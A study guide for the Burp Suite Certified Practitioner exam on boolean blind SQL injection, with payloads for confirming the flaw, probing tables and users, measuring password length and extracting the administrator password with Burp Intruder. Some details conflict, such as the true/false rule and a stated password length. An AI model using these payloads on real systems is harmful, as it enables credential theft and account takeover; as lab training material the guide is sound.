# Blind SQL Injection (Conditional Response) - BSCP Exam Guide

## Core Concept

Blind SQL injection occurs when the application is vulnerable to SQL injection but doesn't display query results or database errors. Instead, the application only shows conditional responses based on whether your injected condition is true or false.

**Key differences from UNION attacks:**
- No direct data output visible
- Must infer information from application responses
- Slower extraction process (character by character)
- Works when UNION attacks are blocked
- Requires understanding boolean logic and conditional queries

**How it works:**
- Inject a condition that evaluates to TRUE or FALSE
- Different response = TRUE, same response = FALSE
- Build data character by character through repeated tests
- Use Burp Intruder to automate the tedious testing

---

## Vulnerability Detection

### Identify Blind SQL Injection

Blind SQL injection requires confirmation that the application processes SQL but doesn't show results directly.

### Test 1: Confirm Injection Point

```
Try normal search:
search=apple

Response: Shows products matching 'apple'
```

### Test 2: Test SQL with Always-True Condition

```
Payload:
search=apple' AND '1'='1

Response: Shows products matching 'apple' (unchanged from Test 1)
Meaning: Query executed, 1=1 is always true, condition doesn't change anything
```

### Test 3: Test SQL with Always-False Condition

```
Payload:
search=apple' AND '1'='2

Response: Shows no products (different from Test 1)
Meaning: 1=2 is always false, query found no matches
```

### Analysis

If Test 2 and Test 3 show DIFFERENT responses, you have blind SQL injection:

```
Test 1 normal: Shows results
Test 2 (TRUE): Shows results (same as Test 1)
Test 3 (FALSE): Shows no results (different)

Conclusion: You can distinguish TRUE from FALSE responses!
```

---

## Conditional Logic Foundation

Before attempting data extraction, understand how conditions work:

### AND Operator

```
Query: WHERE name='apple' AND username='admin'

Result only if BOTH conditions are true:
- name must equal 'apple' 
- AND username must equal 'admin'

If either is false, no results
```

### OR Operator

```
Query: WHERE name='apple' OR username='admin'

Result if EITHER condition is true:
- name equals 'apple'
- OR username equals 'admin'

Both can be true, only one true, or order matters
```

### LIKE Operator with Wildcards

```
LIKE 'a%' matches anything starting with 'a'
LIKE '%a%' matches anything containing 'a'

Example:
password LIKE 's%' 
Would match: 's3cr3t', 'sqlpass', etc.
```

### Comparison Operators

```
> greater than
< less than
>= greater than or equal
<= less than or equal
= equals
!= or <> not equals

Example:
LENGTH(password) > 5
Would be TRUE if password has more than 5 characters
```

---

## Phase 1: Confirming Table and Column Existence

### Testing if a Table Exists

Use a subquery that would only work if the table exists:

```
Payload (assuming products table):
search=apple' AND (SELECT 'x' FROM products LIMIT 1)='x'--

If TRUE (different response):
- The products table exists
- The subquery found at least one row

If FALSE (same as normal search):
- Table doesn't exist or is empty
```

**Key points:**
- LIMIT 1 ensures you only get one row
- 'x' is arbitrary (any string works)
- Comments out rest with --

### Testing if a Column Exists

```
Payload (testing if 'username' column exists in 'users' table):
search=apple' AND (SELECT username FROM users LIMIT 1)='x'--

If TRUE: Column exists and has a value
If FALSE: Column doesn't exist or table is empty

Payload (testing if 'password' column exists):
search=apple' AND (SELECT password FROM users LIMIT 1)='x'--

If TRUE: Column exists
If FALSE: Column doesn't exist
```

---

## Phase 2: Finding Specific Data Values

### Confirming a Username Exists

```
Payload:
search=apple' AND (SELECT username FROM users WHERE username='administrator')='administrator'--

If TRUE (different response):
- A user with username 'administrator' exists

If FALSE (normal response):
- No such user exists
- Try another username
```

**Why this works:**
- Subquery looks for user 'administrator'
- Returns the username if found
- Compares returned username to 'administrator'
- If they match = user exists

### Testing Multiple Usernames

Common default usernames to try:

```
administrator
admin
root
test
user
user1
guest
support
help
info
```

Payload template:
```
search=apple' AND (SELECT username FROM users WHERE username='[USERNAME]')='[USERNAME]'--
```

---

## Phase 3: Extracting Data Length

### Finding Password Length

Before extracting characters, find how many characters the password contains:

```
Payload (test if password > 1 character):
search=apple' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--

If TRUE: Password is longer than 1 character
If FALSE: Password is 1 character or less
```

### Binary Search for Exact Length

```
First test: LENGTH(password)>10
- If TRUE: Password is more than 10 chars, test >15 next
- If FALSE: Password is 10 or less, test >5 next

Second test: LENGTH(password)>15
- If TRUE: Password is 16-20+ chars
- If FALSE: Password is 11-15 chars

Continue narrowing down:
LENGTH(password)>18
LENGTH(password)>19
LENGTH(password)>20
```

**Example walkthrough:**
```
Test >1: TRUE (password > 1 char)
Test >10: TRUE (password > 10 chars)
Test >15: TRUE (password > 15 chars)
Test >20: FALSE (password NOT > 20 chars)
Test >19: FALSE (password NOT > 19 chars)
Test >18: TRUE (password > 18 chars)

Conclusion: Password is exactly 19 characters
```

---

## Phase 4: Character Extraction - Manual Method

### Basic Character Testing

Once you know password length, extract one character at a time:

```
Test first character is 'a':
search=apple' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--

If TRUE: First character is 'a'
If FALSE: First character is not 'a', try 'b', 'c', etc.
```

### Testing All Characters Alphabetically

For each position, test characters in order:

```
Position 1, test 'a': FALSE
Position 1, test 'b': FALSE
Position 1, test 'c': FALSE
...
Position 1, test 's': TRUE

First character is 's'

Position 2, test 'a': FALSE
Position 2, test 'b': FALSE
...
Position 2, test '3': TRUE

Second character is '3'

Continue for all 19 positions
```

**This is tedious and slow - see automated method below**

---

## Phase 5: Character Extraction - Automated with Burp Intruder

This is the essential technique for BSCP exams. Automates finding all password characters.

### Setup in Burp Intruder

**Step 1: Prepare the Payload**

```
Modify your request to include a placeholder for the character:

search=apple' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§x§'--

The § marks show where Intruder will place payloads
```

**Step 2: Send to Intruder**

Right-click request → Send to Intruder

**Step 3: Set Payload Position**

1. Clear default positions (if any)
2. Highlight the 'x' between the § marks
3. Click "Add" to set it as payload position

**Step 4: Configure Payload Type**

1. Go to Payloads tab
2. Payload type: "Simple list"
3. Add all possible characters:
   - a-z (lowercase)
   - A-Z (uppercase)
   - 0-9 (numbers)
   - Special characters: !@#$%^&*-_=+

Or paste this character set:
```
abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*-_=+
```

**Step 5: Run the Attack**

Click "Start attack"

**Step 6: Analyze Results**

Look at Response column:
- One response will be different from all others (usually longer or shows different content)
- That character is the correct one

Example:
```
a: 200 OK (normal response - 2543 bytes)
b: 200 OK (normal response - 2543 bytes)
c: 200 OK (normal response - 2543 bytes)
...
s: 200 OK (different response - 4821 bytes) ← This is it!
t: 200 OK (normal response - 2543 bytes)
```

### Extract All Characters

**For position 1:**
```
Payload:
search=apple' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§x§'--

Result: First character = 's'
```

**For position 2:**
```
Payload:
search=apple' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§x§'--

Result: Second character = '3'
```

**For position 3:**
```
Payload:
search=apple' AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username='administrator')='§x§'--

Result: Third character = 'c'
```

**Repeat for all positions 1-19**

**Final password: s3cr3tpassword12345**

---

## Database-Specific Syntax

### PostgreSQL Blind SQL Injection

```
Confirm injection:
' AND '1'='1
' AND '1'='2

Table discovery:
' AND (SELECT 'x' FROM information_schema.tables LIMIT 1)='x'--

Column discovery:
' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)='x'--

Username confirmation:
' AND (SELECT username FROM users WHERE username='administrator')='administrator'--

Password length:
' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>10)='administrator'--

Character extraction:
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

### MySQL Blind SQL Injection

Syntax is nearly identical to PostgreSQL:

```
Confirm injection:
' AND '1'='1
' AND '1'='2

Table discovery:
' AND (SELECT 'x' FROM information_schema.tables LIMIT 1)='x'--

Column discovery:
' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)='x'--

Username confirmation:
' AND (SELECT username FROM users WHERE username='administrator')='administrator'--

Password length:
' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>10)='administrator'--

Character extraction (note: SUBSTRING vs SUBSTR):
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

### SQL Server Blind SQL Injection

```
Confirm injection:
' AND '1'='1
' AND '1'='2

Table discovery:
' AND (SELECT 'x' FROM information_schema.tables)='x'--

Column discovery:
' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users')='x'--

Username confirmation:
' AND (SELECT username FROM users WHERE username='administrator')='administrator'--

Password length:
' AND (SELECT username FROM users WHERE username='administrator' AND LEN(password)>10)='administrator'--

Character extraction:
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'--
```

### Oracle Blind SQL Injection

Oracle requires FROM clause and uses SUBSTR instead of SUBSTRING:

```
Confirm injection:
' AND '1'='1'--
' AND '1'='2'--

Table discovery:
' AND (SELECT 'x' FROM user_tables)='x'--

Column discovery:
' AND (SELECT column_name FROM user_tab_columns WHERE table_name='USERS')='x'--

Username confirmation:
' AND (SELECT username FROM users WHERE username='administrator')='administrator'--

Password length:
' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>10)='administrator'--

Character extraction:
' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='administrator')='a'--

Note: SUBSTR not SUBSTRING, table names may need to be UPPERCASE
```

---

## Quick Reference Payloads

### Discovery Phase

```
Confirm vulnerability:
' AND '1'='1
' AND '1'='2

Check if table exists:
' AND (SELECT 'x' FROM [table_name] LIMIT 1)='x'--

Check if column exists:
' AND (SELECT [column_name] FROM [table_name] LIMIT 1)='x'--

Check specific value:
' AND (SELECT [column] FROM [table] WHERE [column]='[value]')='[value]'--
```

### Information Extraction Phase

```
Find data length:
' AND LENGTH([column]) > [number]--

Find specific character (position 1):
' AND (SELECT SUBSTRING([column],1,1) FROM [table] WHERE [condition])='[char]'--

Find specific character (position N):
' AND (SELECT SUBSTRING([column],N,1) FROM [table] WHERE [condition])='[char]'--

Or for Oracle:
' AND (SELECT SUBSTR([column],N,1) FROM [table] WHERE [condition])='[char]'--
```

---

## Complete Lab Walkthrough Example

### Scenario: Blind SQL Injection in Product Search

Original vulnerability:
```
GET /search?category=Gifts
SELECT * FROM products WHERE category='Gifts'
```

### Step 1: Confirm Injection

```
Payload 1:
category=Gifts' AND '1'='1

Response: Shows gift products (same as normal)

Payload 2:
category=Gifts' AND '1'='2

Response: Shows no products (different)

Conclusion: SQL injection confirmed - can distinguish TRUE from FALSE
```

### Step 2: Find Database Type

```
Payload:
category=Gifts' AND (SELECT 'x' FROM information_schema.tables LIMIT 1)='x'--

Response: Shows products (TRUE)

Conclusion: MySQL or PostgreSQL (has information_schema)
```

### Step 3: Confirm Users Table Exists

```
Payload:
category=Gifts' AND (SELECT 'x' FROM users LIMIT 1)='x'--

Response: Shows products (TRUE)

Conclusion: users table exists
```

### Step 4: Confirm Admin User Exists

```
Payload:
category=Gifts' AND (SELECT username FROM users WHERE username='administrator')='administrator'--

Response: Shows products (TRUE)

Conclusion: User 'administrator' exists
```

### Step 5: Find Password Length

```
Test >10:
category=Gifts' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>10)='administrator'--
Response: TRUE (shows products)

Test >15:
category=Gifts' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>15)='administrator'--
Response: TRUE (shows products)

Test >20:
category=Gifts' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>20)='administrator'--
Response: FALSE (no products)

Test >19:
category=Gifts' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>19)='administrator'--
Response: FALSE (no products)

Test >18:
category=Gifts' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>18)='administrator'--
Response: TRUE (shows products)

Conclusion: Password is exactly 19 characters
```

### Step 6: Extract All Characters with Intruder

Payload template:
```
category=Gifts' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§x§'--
```

For position 1: Find character = 's'
For position 2: Find character = '3'
For position 3: Find character = 'c'
...continue for all 19 positions

Result: s3cr3tP@ssw0rd2024

### Step 7: Verify and Login

Login with:
```
Username: administrator
Password: s3cr3tP@ssw0rd2024
```

Success! Lab complete.

---

## Common Issues and Solutions

### Issue: Getting TRUE for both conditions

**Problem:**
```
Payload 1: ' AND '1'='1 → Shows results
Payload 2: ' AND '1'='2 → Also shows results
```

**Cause:** Application might not be filtering SQL correctly or error messages are hidden

**Solutions:**
1. Try different injection points (username field, not search)
2. Use time delays instead of conditional responses (not covered in this guide)
3. Try error-based blind SQL injection
4. Check if you're breaking out of quotes correctly (try '' vs ')

### Issue: Can't find the table name

**Common table names to try:**
```
users
admin
accounts
credentials
staff
employees
members
subscribers
```

Payload template:
```
' AND (SELECT 'x' FROM [table_name] LIMIT 1)='x'--
```

### Issue: Found table but can't find column names

**Common column names:**
```
username
password
pwd
pass
user
login
email
id
```

Payload template:
```
' AND (SELECT [column_name] FROM [table_name] LIMIT 1)='x'--
```

### Issue: Confirmed username but password extraction shows all same character

**Cause:** Probably your payload syntax is wrong

**Check:**
- Using correct function: SUBSTRING (MySQL/PostgreSQL) or SUBSTR (Oracle)
- Position number is correct (1,2,3... not 0)
- WHERE clause correctly identifies the user

**Verify payload works:**
```
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='admin'--

Should be FALSE (password's first char is NOT 'admin')
```

### Issue: Burp Intruder showing all responses identical

**Cause:** Payload syntax error - application not executing injected SQL

**Solutions:**
1. Test payload manually first in browser
2. Check if quotes are being escaped (try doubling quotes)
3. Verify table/column names are correct
4. Make sure comment (--) is at the end

### Issue: Intruder responses are all different lengths

**Cause:** Probably means your payload is working! Look for the outlier

**Solution:**
- Sort by response length
- Look for the ONE response that's significantly different
- That's your correct character

---

## Optimization Techniques

### Character Set Ordering

Test more common characters first:

```
Numbers: 0-9 (passwords often have these)
Then: a-z
Then: A-Z
Then: special characters

This reduces average test time
```

### Binary Search for Characters

Instead of testing a-z in order, use binary search:

```
Test 'm' (middle of alphabet)
- If TRUE: test n-z
- If FALSE: test a-l

Reduces tests from 26 to ~5
```

But this requires manual testing - Intruder is faster with full character set.

### Limiting Subquery Results

Use LIMIT to ensure only one row matches:

```
Good:
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator' LIMIT 1)='a'--

Why: Guarantees only one password value returned
```

---

## Final Checklist Before Lab Completion

```
[ ] Confirmed SQL injection (TRUE vs FALSE responses)
[ ] Identified database type (PostgreSQL/MySQL/Oracle/SQL Server)
[ ] Confirmed target table exists (users, admin, etc.)
[ ] Found target username (administrator, admin, etc.)
[ ] Determined password length (exact character count)
[ ] Extracted all password characters using Intruder
[ ] Verified password is complete and readable
[ ] Successfully logged in with credentials
[ ] Lab marked as complete
```

---

## Time Management for BSCP Exam

Blind SQL injection is slower than UNION attacks:

```
Vulnerability confirmation: 2 minutes (TRUE vs FALSE tests)
Database type identification: 1 minute
Table discovery: 2 minutes
Username confirmation: 2 minutes
Password length determination: 5 minutes (binary search)
Character extraction: 10-15 minutes (Intruder automation)

Total: 22-27 minutes per target

Key: Setup Intruder correctly once, then let it run while you take notes
```

---

## Remember

Blind SQL injection is about inference and automation. You can't see the data directly, so you ask yes/no questions through conditional logic. Burp Intruder is your friend - use it to brute force characters rather than testing manually.

The methodology is always:
1. Confirm injection exists
2. Find what data you want
3. Measure its length
4. Extract it character by character
5. Piece it together

Practice this flow and these labs become routine.